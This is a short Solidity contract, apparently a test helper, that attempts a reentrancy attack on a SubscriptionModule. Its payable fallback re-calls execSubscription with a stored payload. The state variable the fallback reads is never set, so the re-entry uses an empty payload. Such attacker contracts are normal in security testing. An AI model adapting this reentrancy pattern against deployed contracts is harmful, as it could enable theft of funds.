pragma solidity ^0.5.0;

import "./common/Enum.sol";
import "./modules/SubscriptionModule.sol";

contract ReEntryAttacker {

    struct Payload {
        address to;
        uint256 value;
        bytes data;
        Enum.Operation operation;
        uint256 safeTxGas;
        uint256 dataGas;
        uint256 gasPrice;
        address gasToken;
        address payable refundReceiver;
        bytes meta;
        bytes signatures;
    }

    address payable subModule;

    bytes32 activeAttack;

    mapping(bytes32 => Payload) public payloads;

    constructor(
        address payable _subModuleAddr
    )
    public
    {
        subModule = _subModuleAddr;
    }

    function attack(
        address payable to,
        uint256 value,
        bytes memory data,
        Enum.Operation operation,
        uint256 safeTxGas,
        uint256 dataGas,
        uint256 gasPrice,
        address gasToken,
        address payable refundReceiver,
        bytes memory meta,
        bytes memory signatures
    )
    public
    {
        bytes32 _activeAttack = SubscriptionModule(subModule)
        .getSubscriptionHash(
            to,
            value,
            data,
            operation,
            safeTxGas,
            dataGas,
            gasPrice,
            gasToken,
            refundReceiver,
            meta
        );

        payloads[_activeAttack] = Payload(
            to,
            value,
            data,
            operation,
            safeTxGas,
            dataGas,
            gasPrice,
            gasToken,
            refundReceiver,
            meta,
            signatures
        );

        SubscriptionModule(subModule)
        .execSubscription(
            to,
            value,
            data,
            operation,
            safeTxGas,
            dataGas,
            gasPrice,
            gasToken,
            refundReceiver,
            meta,
            signatures
        );
    }

    function()
    external
    payable {

        Payload storage _attack = payloads[activeAttack];

        SubscriptionModule(subModule)
        .execSubscription(
            _attack.to,
            _attack.value,
            _attack.data,
            _attack.operation,
            _attack.safeTxGas,
            _attack.dataGas,
            _attack.gasPrice,
            _attack.gasToken,
            _attack.refundReceiver,
            _attack.meta,
            _attack.signatures
        );
    }
}
